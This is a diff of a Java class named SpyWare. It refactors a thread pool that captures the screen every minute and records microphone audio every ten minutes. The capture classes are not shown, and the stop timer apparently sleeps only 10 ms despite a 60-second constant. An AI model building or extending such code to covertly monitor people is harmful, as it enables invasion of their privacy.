@@ -1,50 +1,75 @@
 package spy;
 
+
 import java.util.concurrent.ScheduledThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
 public class SpyWare {
 
-    /**
-     * Voice recording duration
-     */
     private static final long RECORD_TIME = 60000;
 
-    public static void main(String[] args) {
-        Runnable screenshotRunnable = Screenshot::captureScreen;
-        Runnable recorderRunnable = SpyWare::recorderThread;
-        scheduledSpyWork(screenshotRunnable, recorderRunnable);
+    private static ScheduledThreadPoolExecutor pool;
+
+    public SpyWare() {
+        //initialize the pool
+        pool = new ScheduledThreadPoolExecutor(2);
+    }
+
+    public void scheduledSpyWork() {
+        startTakingScreenshot();
+        startAndFinishRecordingAudio();
+    }
+
+
+    private void startTakingScreenshot() {
+        Screenshot screenshot = new Screenshot();
+        pool.scheduleWithFixedDelay(screenshot::captureScreen,
+                0, 1, TimeUnit.MINUTES);
     }
 
     /**
-     * Starts recording and stop until the duration.
+     * Using scheduled thread pool we will keep starting the stopper timer
+     * thread and start recording. Which will happen again and again after a
+     * certain time period.
      */
-    public static void recorderThread() {
+    public static void startAndFinishRecordingAudio() {
+        Runnable runnable = SpyWare::initStopperAndStartRecording;
+        pool.scheduleWithFixedDelay(runnable, 0, 10, TimeUnit.MINUTES);
+    }
+
+    /**
+     * Prepare and execute stopper thread which will work like a timer and
+     * start recording immediately after that.
+     */
+    public static void initStopperAndStartRecording() {
         AudioRecorder audioRecorder = new AudioRecorder();
-        Runnable runnable = () -> audioRecorder.stopRecordingAudio(RECORD_TIME);
-        Thread stopper = new Thread(runnable);
-        stopper.start();
+        stopperThread(audioRecorder);
         audioRecorder.startRecording();
     }
 
     /**
-     * Defines scheduled pool of 2 threads. Initially we will add both
-     * runnable of taking screenshot and voice recorder.
-     * In every minute a screenshot will be captured and after every 10
-     * minutes a voice will be recording for a specific amount of time.
+     * This method is responsible for creating a thread which will stop audio
+     * line using Thread.sleep() method.
      *
-     * @param screenshotRunnable takes screenshot
-     * @param recorderRunnable records voice
+     * @param audioRecorder audioRecorder
      */
-    public static void scheduledSpyWork(Runnable screenshotRunnable,
-                                        Runnable recorderRunnable) {
-        // Initialize scheduled thread pool.
-        ScheduledThreadPoolExecutor scheduledThreadPoolExecutor =
-                new ScheduledThreadPoolExecutor(2);
-        // execute runnable in thread pool. screen capture and voice recorder
-        scheduledThreadPoolExecutor.scheduleWithFixedDelay(screenshotRunnable,
-                0,1, TimeUnit.MINUTES);
-        scheduledThreadPoolExecutor.scheduleWithFixedDelay(recorderRunnable,
-                0, 10, TimeUnit.MINUTES);
+    public static void stopperThread(AudioRecorder audioRecorder) {
+        Thread t1 = new Thread(() -> stopAudioLine(audioRecorder));
+        t1.start();
+    }
+
+    /**
+     * We will use a thread to stop the recording. The thread will sleep for
+     * some time and will stop the audio line after that.
+     *
+     * @param audioRecorder audioRecorder
+     */
+    public static void stopAudioLine(AudioRecorder audioRecorder) {
+        try {
+            Thread.sleep(10);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+        audioRecorder.finish();
     }
 }
